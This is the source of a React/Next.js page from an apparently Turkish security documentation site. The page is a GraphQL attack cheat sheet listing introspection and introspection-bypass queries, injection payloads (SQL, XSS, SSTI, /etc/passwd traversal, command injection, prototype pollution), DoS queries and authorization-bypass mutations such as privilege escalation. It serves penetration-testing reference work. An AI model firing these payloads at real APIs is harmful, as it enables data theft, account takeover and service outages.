"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "introspection", title: "Introspection", level: 2 },
  { id: "introspection-bypass", title: "Introspection Bypass", level: 2 },
  { id: "graphql-injection", title: "GraphQL Injection", level: 2 },
  { id: "dos", title: "DoS / Resource Exhaustion", level: 2 },
  { id: "auth-bypass", title: "Authorization Bypass", level: 2 },
]

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function GraphQLPage() {
  return (
    <>
    <TableOfContents items={tocItems} />
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">GraphQL Security</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          GraphQL API&apos;lerindeki güvenlik zafiyetleri. Introspection, injection, DoS ve
          authorization bypass teknikleri.
        </p>
      </motion.div>

      <Callout type="info" title="GraphQL Endpoint Detection">
        Yaygın endpoint&apos;ler: /graphql, /graphiql, /v1/graphql, /api/graphql, /query,
        /gql, /playground. GET ve POST deneyin.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="introspection" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Introspection</h2>
        <p className="text-muted-foreground mb-4">
          Introspection query ile tüm şemayı çıkarın. Type&apos;lar, field&apos;lar,
          mutation&apos;lar ve input type&apos;ları keşfedin.
        </p>
        <PayloadList
          title="Introspection Queries"
          initialShow={6}
          payloads={[
            { code: `{__schema{types{name,fields{name,type{name}}}}}`, note: "Tüm type ve field'ları listele" },
            { code: `{__schema{queryType{fields{name,description}}}}`, note: "Query type field'ları" },
            { code: `{__schema{mutationType{fields{name,description}}}}`, note: "Mutation type field'ları" },
            { code: `{__schema{subscriptionType{fields{name}}}}`, note: "Subscription type" },
            { code: `{__type(name:"User"){fields{name,type{name,kind}}}}`, note: "Belirli type detayı" },
            { code: `query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}`, note: "Full introspection query" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="introspection-bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Introspection Bypass</h2>
        <PayloadList
          title="Introspection Disabled Bypass"
          initialShow={6}
          payloads={[
            { code: `GET /graphql?query={__schema{types{name}}}`, note: "GET method dene" },
            { code: `{"query":"\\n{__schema{types{name}}}"}`, note: "Newline prefix" },
            { code: `{"query":"{__schema   {types{name}}}"}`, note: "Extra whitespace" },
            { code: `{"query":"{__type(name:\\"User\\"){name fields{name}}}"}`, note: "Sadece __type kullan" },
            { code: `query{__typename}`, note: "Basic type leak" },
            { code: `{__schema @skip(if:false){types{name}}}`, note: "Directive bypass" },
            { code: `mutation{__typename}`, note: "Mutation context" },
            { code: `POST /graphql with Content-Type: application/x-www-form-urlencoded`, note: "Content-Type değiştir" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="graphql-injection" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">GraphQL Injection</h2>
        <PayloadList
          title="Injection Payloads"
          initialShow={8}
          payloads={[
            { code: `{user(id:"1' OR '1'='1"){name email}}`, note: "SQL injection via GraphQL" },
            { code: `{user(id:"1\\" OR 1=1--"){name}}`, note: "SQL injection double quote" },
            { code: `{search(query:"<script>alert(1)</script>"){title}}`, note: "XSS via GraphQL" },
            { code: `{user(name:"{{7*7}}"){id}}`, note: "SSTI via GraphQL" },
            { code: `{file(path:"../../../etc/passwd"){content}}`, note: "Path traversal" },
            { code: `{user(id:"1; ls -la"){name}}`, note: "Command injection" },
            { code: `mutation{createUser(input:{name:"test","__proto__":{"isAdmin":true}}){id}}`, note: "Prototype pollution" },
            { code: `{users(filter:{OR:[{isAdmin:true}]}){id email}}`, note: "Filter bypass" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="dos" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">DoS / Resource Exhaustion</h2>
        <PayloadList
          title="DoS Payloads"
          initialShow={6}
          payloads={[
            { code: `{users{friends{friends{friends{friends{friends{name}}}}}}}`, note: "Deep nested query" },
            { code: `{users(first:10000){edges{node{posts(first:10000){title}}}}}`, note: "Large pagination" },
            { code: `query{a1:users{id}a2:users{id}a3:users{id}...a100:users{id}}`, note: "Aliasing - 100x aynı query" },
            { code: `fragment A on User{friends{...B}} fragment B on User{friends{...A}}`, note: "Circular fragment (bazı impl)" },
            { code: `[{"query":"..."}, {"query":"..."}, ... x1000]`, note: "Batch query abuse" },
            { code: `{__schema{types{fields{type{fields{type{fields{name}}}}}}}}`, note: "Introspection depth attack" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="auth-bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Authorization Bypass</h2>
        <PayloadList
          title="Auth Bypass Payloads"
          initialShow={6}
          payloads={[
            { code: `{user(id:"other-user-id"){email password_hash}}`, note: "IDOR via GraphQL" },
            { code: `mutation{deleteUser(id:"victim"){success}}`, note: "Unauthorized mutation" },
            { code: `{node(id:"base64_global_id"){... on PrivateData{secret}}}`, note: "Relay global ID abuse" },
            { code: `mutation{updateRole(userId:"me",role:ADMIN){success}}`, note: "Self privilege escalation" },
            { code: `{__type(name:"AdminQuery"){fields{name}}}`, note: "Admin type discovery" },
            { code: `subscription{privateEvents{data}}`, note: "Unauthorized subscription" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Araçlar">
        1. InQL Scanner - Burp extension for GraphQL{"\n"}
        2. GraphQLmap - automated testing{"\n"}
        3. Clairvoyance - introspection disabled schema recovery{"\n"}
        4. BatchQL - batch query detection{"\n"}
        5. graphw00f - GraphQL fingerprinting
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/rate-limiting" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Rate Limiting</span>
        </Link>
        <Link href="/docs/api/rest" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>REST API</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
    </>
  )
}
